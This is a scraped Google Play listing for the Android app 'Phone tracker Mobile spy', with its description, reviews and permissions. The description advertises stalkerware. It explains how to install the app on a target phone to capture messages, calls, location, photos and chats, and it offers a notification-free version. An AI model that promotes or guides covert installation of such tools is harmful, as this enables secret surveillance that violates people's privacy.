{
  "title": "Phone tracker Mobile spy",
  "playStoreURL": "https://play.google.com/store/apps/details?id=com.camobile_soft.spa",
  "category": "Tools",
  "price": "Free",
  "datePublished": "September 5, 2013",
  "version": "3.1",
  "operatingSystems": "2.1 and up",
  "ratingsCount": "16",
  "rating": "4.6875",
  "contentRating": "Medium Maturity",
  "creator": "CAMobile Soft",
  "creatorURL": "https://play.google.com/store/apps/details?id=com.camobile_soft.spa",
  "extendedInfo": {
    "installSize": "1.8M",
    "downloadsCount": "5,000+",
    "downloadsCountText": "5,000 - 10,000",
    "description": "Phone tracker Mobile spy is a complete surveillance tool for smartphones. It can be used for underage children control, for monitoring the activity of employees, or even to recover lost data or to trace a missing/stolen smartphone. It gives you all the details about call logs, SMS logs, MMS logs, GPS location, browsing activity. It is also suitable for monitoring applications like Facebook and Whatsapp. It is easy to download and get it running.  Phone tracker Mobile spy works on Android 2.1 and up. It runs on low power resources and doesn’t affect the activity of the phone or other applications.*Spy phone app install guide:*INSTALL THE APPLICATION ON THE PHONE YOU WANT TO MONITOR.-Download the app from Google Play and install it on the target phone. After you finish installing use the OPEN BUTTON FROM GOOGLE PLAY. We have also added a NOTIFICATION on the phone, in order to comply with the terms of use of Google Play. If you need a version without ANY NOTIFICATIONS, you should check our website, where we have more custom installers- When you first run the application, you will be asked to register an account with email address and password, which you will use later for accessing the logs on the website.- Enter a name for the target phone.- Login to http://www.spy-phone-app.com/spy/index/ with the email and password provided earlier.- After about an hour you can check the logs on the website. The target phone must have INTERNET ACCESS in order to send the logs to the server.For more details please see http://www.spy-phone-app.com .Spy Phone App records:- MMS/SMS logs. This mobile surveillance application gives you access to both sent and received mms and sms. You will be able to monitor all log details (date, sender details), the written content of the messages, GPS position of the target phone and media attached. - CALL logs. Spy phone app will track and record the details of incoming or outgoing phone calls. You will be able to access the contact name and call duration.- GPS logs. GPS data will also be sent periodically to the server.  You will be able to see the position of the device on a map, and also the geographical coordinates of that position.- BROWSER logs. This phone surveillance application keeps track of the browser activity as well. It will show you the main domain name and the date when it was accessed. - SYSTEM logs. It monitors shutdown or power on logs. It also records ringer changes like set to vibrate or set to silent.-FACEBOOK logs. It will monitor Facebook chat/ messages for the target phones that have ROOT.-WHATSAPP logs. It will monitor Whastapp activity for the target phones that have ROOT.-PICTURE logs. Phone tracker Mobile spy will store copies of pictures taken or downloaded.-New CONTACTS logs. Spy phone app will log the details (name, phone no) of new contacts added to the Address Book.Spy Phone App is free to download from Google Play or from our website, for anyone who wants to try it. You will have a 5 days trial period, in which you will have full access to the app’s features. After that you can activate for every registered phone a trial period of another five days. After the trial period expires you will have full access to browse your logs on the website, only if you subscribe (we offer one of the lowest subscription fees).PLEASE NOTE THAT THIS APP IS INTENDED FOR LEGAL PURPOSES ONLY, SUCH AS PARENTAL CONTROL. IT IS YOUR RESPONSIBILITY TO USE IT AS INTENDED AND TO OBEY ALL APPLICABLE LEGISLATION. WE WILL DELETE THE ACCOUNTS THAT DO NOT COMPLY WITH OUR TERMS OF SERVICE. Legal agreement: https://www.spy-phone-app.com/terms_of_serviceFor any problems (installing, running, using) related to Phone tracker Mobile spy, we recommend that you contact us using the following section from the page http://www.spy-phone-app.com/contact . We offer technical assistance for this application and this way we can help you fix your problem.",
    "reviews": [
      {
        "timestampMsec": "1375943489044",
        "starRating": "5",
        "title": "Works great",
        "comment": "Don\\'t understand the GPS needs to be more detailed in time of location",
        "commentId": "gp:AOqpTOGe6SaeBM4eWDXJhOA-C2FKK3DdVn1rN7UJ_dAEEcvqKzUh0JzOQgiTPrhs82f0oszHOBDPdO6c09vLdyg",
        "author": "stuart barker",
        "authorURL": "http://lh5.googleusercontent.com/-8DDraOPWooM/AAAAAAAAAAI/AAAAAAAAACw/bnJpAgOAgPY/photo.jpg",
        "authorSecureURL": "https://lh5.googleusercontent.com/-8DDraOPWooM/AAAAAAAAAAI/AAAAAAAAACw/bnJpAgOAgPY/photo.jpg"
      },
      {
        "timestampMsec": "1375991369313",
        "starRating": "5",
        "title": "Great app",
        "comment": "I love this application",
        "commentId": "gp:AOqpTOFCNJ6l9TiTvti6Dga5G-k3T5hHueH-cpzjyIYnM3_Je81lOJjlsqnKzWQeNeIZ4zz4r3bbFCnE57dKFpM",
        "author": "Andrei Ciuca",
        "authorURL": "http://lh5.ggpht.com/RREE0f2gSFRq9Yi_umALXt_ML6nJbTYJ6TEsCJg-75c1TUjH4nqP0KNfOsDqxaa_CqY",
        "authorSecureURL": "https://lh5.ggpht.com/RREE0f2gSFRq9Yi_umALXt_ML6nJbTYJ6TEsCJg-75c1TUjH4nqP0KNfOsDqxaa_CqY"
      },
      {
        "timestampMsec": "1377071206260",
        "starRating": "5",
        "title": "awesome ,but......",
        "comment": "awesome app but kinda sucks that you have to pay for it after the free trial. but even thought it\\'s still worth every penny!!!!",
        "commentId": "gp:AOqpTOH2Ir6dQMgWAuJMMOYPDpgWx9DxGcLNF-4iE9W9XkluJU-g2omWmCmm3bsTWKgN1sAkyPR3__D4r3-TI2E",
        "author": "Michelle Sanders",
        "authorURL": "http://lh5.ggpht.com/RREE0f2gSFRq9Yi_umALXt_ML6nJbTYJ6TEsCJg-75c1TUjH4nqP0KNfOsDqxaa_CqY",
        "authorSecureURL": "https://lh5.ggpht.com/RREE0f2gSFRq9Yi_umALXt_ML6nJbTYJ6TEsCJg-75c1TUjH4nqP0KNfOsDqxaa_CqY"
      }
    ],
    "permissions": [
      "android.permission.READ_PHONE_STATE",
      "android.permission.WRITE_EXTERNAL_STORAGE",
      "android.permission.RECEIVE_SMS",
      "android.permission.READ_SMS",
      "android.permission.RECEIVE_MMS",
      "android.permission.RECEIVE_BOOT_COMPLETED",
      "android.permission.INTERNET",
      "android.permission.READ_CONTACTS",
      "android.permission.ACCESS_FINE_LOCATION",
      "android.permission.GET_ACCOUNTS",
      "android.permission.ACCESS_WIFI_STATE",
      "android.permission.USE_CREDENTIALS",
      "android.permission.MANAGE_ACCOUNTS",
      "android.permission.ACCESS_NETWORK_STATE",
      "com.android.browser.permission.READ_HISTORY_BOOKMARKS",
      "android.permission.READ_LOGS",
      "android.permission.READ_EXTERNAL_STORAGE",
      "android.permission.READ_CALL_LOG"
    ]
  }
}
